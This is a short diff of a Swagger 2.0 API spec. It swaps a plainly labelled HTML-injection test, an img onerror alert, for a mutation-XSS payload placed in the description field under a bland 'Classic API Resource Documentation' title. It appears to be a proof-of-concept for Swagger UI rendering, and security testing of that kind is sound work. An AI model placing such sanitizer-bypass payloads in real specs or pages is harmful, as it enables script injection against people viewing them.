@@ -1,11 +1,5 @@
 swagger: '2.0'
 info:
-  version: 1.0.0
-  title: Swagger Ui Vulnerable to Html Injection 
-  description: <img src=x onerror=alert('XSS')>
-paths:
-  /:
-    post:
-      responses:
-        '200':
-          description: Login successful
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><img onerror=alert('textarea') src=1>"></form>
